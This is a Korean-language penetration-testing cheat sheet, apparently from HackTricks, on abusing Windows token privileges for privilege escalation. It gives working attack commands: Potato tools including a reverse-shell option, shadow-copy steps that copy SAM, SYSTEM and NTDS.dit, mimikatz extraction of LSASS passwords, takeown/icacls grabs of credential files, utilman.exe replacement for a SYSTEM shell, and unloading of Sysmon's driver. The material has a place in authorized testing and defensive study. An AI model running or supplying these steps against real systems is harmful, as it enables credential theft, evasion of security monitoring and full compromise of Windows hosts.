# Tokens 악용

{{#include ../../banners/hacktricks-training.md}}

## Tokens

**Windows Access Tokens가 무엇인지 모른다면** 계속하기 전에 다음 페이지를 읽으세요:


{{#ref}}
access-tokens.md
{{#endref}}

**이미 보유한 tokens를 악용하여 권한을 상승할 수 있을 수도 있습니다**

### SeImpersonatePrivilege

이 privilege는 모든 token을 impersonation할 수 있도록 모든 process가 보유할 수 있는 privilege입니다. 단, token을 생성할 수는 없으며 해당 token에 대한 handle을 얻을 수 있어야 합니다. Windows service(DCOM)가 exploit에 대해 NTLM authentication을 수행하도록 유도하면 privileged token을 획득할 수 있으며, 이를 통해 SYSTEM privileges로 process를 실행할 수 있습니다.<sup>[[2]](#references)</sup> 이 vulnerability는 [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)(winrm이 disabled 상태여야 함), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)와 같은 다양한 tools를 사용하여 exploit할 수 있습니다.

최신 operator 참고 사항:

- **JuicyPotato는 legacy입니다**: Windows 10 1809+/Server 2019+에서는 도달 가능한 RPC/COM surface에 따라 **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** 또는 **PrintSpoofer**를 우선 사용하세요.
- **`LOCAL SERVICE`** 또는 **`NETWORK SERVICE`**로 실행 중인 service를 compromise했고 `whoami /priv`에 **`SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`가 없는 filtered token**이 표시된다면, 먼저 해당 account의 **default privilege set**을 복구한 다음(예: **FullPowers** 사용) Potato 계열을 다시 시도하세요.<sup>[[3]](#references)</sup>
- 일부 최신 fork는 original tools보다 operator 친화적입니다. 예를 들어 **SigmaPotato**는 reflection/in-memory execution 및 최신 Windows compatibility를 제공하며, **PrintNotifyPotato**는 PrintNotify COM service를 악용하므로 일반적인 Spooler path가 disabled 상태일 때 유용한 경우가 많습니다.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**와 매우 유사하며, **동일한 방법**을 사용해 권한 있는 token을 가져옵니다.\
그런 다음 이 privilege를 사용하면 새 process 또는 suspended process에 **primary token을 할당**할 수 있습니다. 권한 있는 impersonation token을 사용하면 primary token을 파생할 수 있습니다(DuplicateTokenEx).\
이 token을 사용하면 'CreateProcessAsUser'로 **새 process**를 생성하거나, process를 suspended 상태로 생성한 후 **token을 설정**할 수 있습니다(일반적으로 실행 중인 process의 primary token은 수정할 수 없습니다).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

이 token이 활성화되어 있으면 **KERB_S4U_LOGON**을 사용해 credential을 몰라도 다른 사용자의 **impersonation token**을 가져오고, token에 **임의의 group**(admins)을 추가하고, token의 **integrity level**을 "**medium**"으로 설정한 다음, 이 token을 **현재 thread**에 할당할 수 있습니다(SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

이 privilege를 사용하면 시스템이 모든 파일에 대한 **read access** 제어 권한을 부여합니다(읽기 작업으로 제한됨). 이는 registry에서 로컬 Administrator 계정의 **password hash**를 읽는 데 사용되며, 이후 "**psexec**" 또는 "**wmiexec**"와 같은 tools를 hash와 함께 사용할 수 있습니다(Pass-the-Hash technique). 그러나 다음 두 조건에서는 이 technique이 실패합니다. Local Administrator 계정이 비활성화되어 있거나, 원격으로 연결하는 Local Administrators에서 administrative rights를 제거하는 policy가 적용된 경우입니다.<sup>[[2]](#references)</sup>\
실무에서 가장 신뢰할 수 있는 built-in workflow는 일반적으로 **VSS + `robocopy /b`**입니다. shadow copy를 생성하고 노출한 다음, **backup mode**로 `SAM`/`SYSTEM` 또는 `NTDS.dit`를 복사하면 file ACL을 우회할 수 있습니다.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
이 **권한을 악용**하는 방법은 다음과 같습니다.

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)의 **IppSec**을 따릅니다.
- 또는 다음 문서의 **Backup Operators를 사용한 권한 상승** 섹션에 설명된 방법을 사용합니다.


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

이 권한은 파일의 Access Control List (ACL)와 관계없이 모든 시스템 파일에 **쓰기 액세스**할 수 있도록 합니다. 이를 통해 **서비스 수정**, DLL Hijacking 수행, Image File Execution Options를 통한 **debuggers 설정** 등 다양한 권한 상승 방법을 사용할 수 있습니다.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege는 특히 사용자가 token을 impersonate할 수 있는 경우에 유용한 강력한 권한이며, SeImpersonatePrivilege가 없는 경우에도 사용할 수 있습니다. 이 기능은 현재 프로세스의 integrity level보다 높지 않은 integrity level을 가지며 동일한 사용자를 나타내는 token을 impersonate할 수 있는지에 달려 있습니다.<sup>[[2]](#references)</sup>

**핵심 사항:**

- **SeImpersonatePrivilege 없이 impersonation:** 특정 조건에서 token을 impersonate하여 EoP에 SeCreateTokenPrivilege를 활용할 수 있습니다.
- **Token impersonation 조건:** 성공적인 impersonation을 위해서는 대상 token이 동일한 사용자에 속해야 하며, 대상 token의 integrity level이 impersonation을 시도하는 프로세스의 integrity level보다 낮거나 같아야 합니다.
- **Impersonation token 생성 및 수정:** 사용자는 impersonation token을 생성한 다음 권한 있는 그룹의 SID (Security Identifier)를 추가하여 해당 token을 강화할 수 있습니다.

### SeLoadDriverPrivilege

이 권한을 사용하면 `ImagePath` 및 `Type`에 특정 값을 지정한 registry entry를 생성하여 **device drivers를 load 및 unload**할 수 있습니다. `HKLM` (HKEY_LOCAL_MACHINE)에 직접 쓰기 액세스하는 것은 제한되어 있으므로 대신 `HKCU` (HKEY_CURRENT_USER)를 사용해야 합니다. 하지만 driver configuration에서 `HKCU`를 kernel이 인식하도록 하려면 특정 path를 따라야 합니다.<sup>[[2]](#references)</sup>

최신 offensive 사용 방식은 일반적으로 **BYOVD** (bring your own vulnerable driver)입니다. 즉, **서명되었지만 취약한** kernel driver를 load한 다음 해당 driver의 IOCTLs를 사용하여 보호 기능을 비활성화하거나 kernel code execution으로 이동합니다. 최신 Windows 11/Server 빌드에서는 **Microsoft vulnerable driver blocklist** 및/또는 **HVCI/Memory Integrity**로 인해 오래된 public chain이 작동하지 않는 경우가 많으므로, 기존의 `szkg64.sys` 스타일 예제가 더 이상 모든 환경에서 안정적으로 작동하지 않는다는 점에 유의해야 합니다.

이 path는 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`이며, 여기서 `<RID>`는 현재 사용자의 Relative Identifier입니다. `HKCU` 내부에 이 전체 path를 생성하고 다음 두 값을 설정해야 합니다.<sup>[[2]](#references)</sup>

- `ImagePath`: 실행할 binary의 path
- `Type`: `SERVICE_KERNEL_DRIVER` (`0x00000001`) 값

**수행 단계:**

1. 쓰기 액세스가 제한되어 있으므로 `HKLM` 대신 `HKCU`에 액세스합니다.
2. `<RID>`가 현재 사용자의 Relative Identifier를 나타내는 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` path를 `HKCU` 내부에 생성합니다.
3. `ImagePath`를 binary의 execution path로 설정합니다.
4. `Type`을 `SERVICE_KERNEL_DRIVER` (`0x00000001`)로 지정합니다.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
이 권한을 악용하는 더 많은 방법은 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)에서 확인할 수 있습니다.

### SeTakeOwnershipPrivilege

이는 **SeRestorePrivilege**와 유사합니다. 주요 기능은 WRITE_OWNER 액세스 권한을 제공하여 명시적인 discretionary access 요구 사항을 우회하고, 프로세스가 **객체의 소유권을 가질 수 있도록 하는 것**입니다. 이 과정에서는 먼저 대상 레지스트리 키에 대한 소유권을 확보하여 쓰기 작업을 수행한 다음, 쓰기 작업을 활성화하도록 DACL을 변경합니다.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

이 권한을 사용하면 **다른 프로세스를 디버깅**할 수 있으며, 메모리를 읽고 쓸 수도 있습니다. 이 권한을 사용하면 대부분의 antivirus 및 host intrusion prevention solutions를 우회할 수 있는 다양한 memory injection 전략을 사용할 수 있습니다.<sup>[[2]](#references)</sup>

최신 Windows에서는 `SeDebugPrivilege`만으로도 일반적으로 **보호되지 않는 SYSTEM 프로세스**를 열고 해당 프로세스의 토큰을 복제할 수 있지만, 이것이 **LSASS**에 접근할 수 있다는 보장은 아니라는 점을 기억해야 합니다. **RunAsPPL / LSA Protection**이 활성화되어 있으면 `SeDebugPrivilege`가 있어도 보호되지 않는 프로세스는 LSASS를 읽거나 LSASS에 주입할 수 없습니다. 이 경우 다른 비-PPL SYSTEM 프로세스에서 토큰을 탈취하거나, `procdump`가 작동할 것이라고 가정하지 말고 PPL bypass/BYOVD와 chain해야 합니다. `SeDebugPrivilege` + `SeImpersonatePrivilege`를 사용한 전체 token-copy 예제는 [이 페이지](sedebug-+-seimpersonate-copy-token.md)를 확인하세요.

#### 메모리 덤프

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)의 [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)를 사용하여 **프로세스의 메모리를 캡처**할 수 있습니다. 특히 이는 사용자가 시스템에 성공적으로 로그인한 후 사용자 credentials를 저장하는 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** 프로세스에 적용할 수 있습니다.

그런 다음 이 dump를 mimikatz에 로드하여 passwords를 얻을 수 있습니다:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

`NT SYSTEM` shell을 얻으려면 다음을 사용할 수 있습니다:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

이 권한(볼륨 유지 관리 작업 수행)을 사용하면 원시 볼륨 장치 핸들(예: \\.\C:)을 열어 NTFS ACL을 우회하는 직접 디스크 I/O를 수행할 수 있습니다. 이를 통해 기반 블록을 읽어 볼륨에 있는 모든 파일의 바이트를 복사할 수 있으므로, 민감한 자료(예: %ProgramData%\Microsoft\Crypto\의 machine private keys, registry hives, VSS를 통한 SAM/NTDS)를 임의로 읽을 수 있습니다.<sup>[[5]](#references)</sup> CA 서버에서는 CA private key를 exfiltrating하여 모든 principal을 사칭할 수 있는 Golden Certificate를 forge할 수 있으므로 특히 영향이 큽니다.<sup>[[6]](#references)</sup>

자세한 기법과 완화 방법은 다음을 참조하세요.

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 권한 확인
```
whoami /priv
```
**Disabled**로 표시된 **tokens**는 일반적으로 활성화할 수 있으므로, _Enabled_ 및 _Disabled_ 권한을 모두 악용할 수 있는 경우가 많습니다.

### 모든 tokens 활성화

비활성화된 권한이 있는 경우, 스크립트 [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)를 사용하여 모든 tokens를 활성화할 수 있습니다:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
또는 이 [**게시물**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)에 포함된 **script**입니다.

## 표

전체 token privileges cheatsheet는 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)에서 확인할 수 있으며, 아래 요약에는 해당 privilege를 직접 악용하여 admin session을 얻거나 민감한 파일을 읽는 방법만 나열합니다.<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"사용자가 token을 impersonate하고 potato.exe, rottenpotato.exe, juicypotato.exe와 같은 tool을 사용하여 nt system으로 privesc할 수 있습니다."_                                                                                                                                                                                                      | 업데이트해 주신 [Aurélien Chalot](https://twitter.com/Defte_)에게 감사드립니다. 곧 더 recipe와 같은 형식으로 다시 작성하겠습니다.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` 또는 전용 SeBackup-aware copy helper를 사용하여 민감한 파일을 읽습니다.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, 그리고 경우에 따라 `%WINDIR%\MEMORY.DMP`에 유용합니다.<br><br>- `robocopy`는 편리하지만, 전용 SeBackup cmdlet/API가 잠겨 있거나 열려 있는 파일에 더 유연한 경우가 많습니다.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken`을 사용하여 local admin rights를 포함한 임의의 token을 생성합니다.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** SYSTEM token을 duplicate하거나 보호되지 않은 process에서 memory를 dump합니다.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection이 활성화되어 있으면 LSASS dumping이 일반적으로 차단됩니다.</p><p>Script는 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)에서 확인할 수 있습니다.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation을 사용하여 SYSTEM을 spawn합니다(`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` 등).                                                                                                                                                                                    | <p>IIS APPPOOL, MSSQL, scheduled task 또는 이미 `SeImpersonatePrivilege`를 보유한 모든 context와 같은 service account에서 가장 실용적입니다.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. 서명되었지만 취약한 kernel driver(BYOVD)를 load합니다.<br>2. driver의 IOCTL을 사용하여 kernel R/W를 얻거나 security tooling을 비활성화하거나 SYSTEM으로 elevate합니다.<br><br>또는 이 privilege를 사용하여 `fltMC` builtin command로 security 관련 driver를 unload할 수 있습니다. 예: <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code>와 같은 오래된 public driver는 vulnerable-driver blocklist / HVCI로 인해 최신 Windows에서 점점 더 차단되고 있습니다.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege가 존재하는 상태로 PowerShell/ISE를 launch합니다.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>로 privilege를 enable합니다.<br>3. utilman.exe를 utilman.old로 rename합니다.<br>4. cmd.exe를 utilman.exe로 rename합니다.<br>5. console을 lock하고 Win+U를 누릅니다.</p> | <p>일부 AV software에서 attack이 detect될 수 있습니다.</p><p>Alternative method는 동일한 privilege를 사용하여 "Program Files"에 저장된 service binary를 replace하는 방식입니다.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe를 utilman.exe로 rename합니다.<br>4. console을 lock하고 Win+U를 누릅니다.</p>                                                                                                                                       | <p>일부 AV software에서 attack이 detect될 수 있습니다.</p><p>Alternative method는 동일한 privilege를 사용하여 "Program Files"에 저장된 service binary를 replace하는 방식입니다.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>local admin rights가 포함되도록 token을 manipulate합니다. SeImpersonate가 필요할 수 있습니다.</p><p>검증 필요.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privilege에서 admin으로 이어지는 exploitation path](https://github.com/gtworek/Priv2Admin)
- [2] [Token Privilege를 이용한 LPE 악용](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode가 file/folder ACL check를 우회)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – volume maintenance task 수행(SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
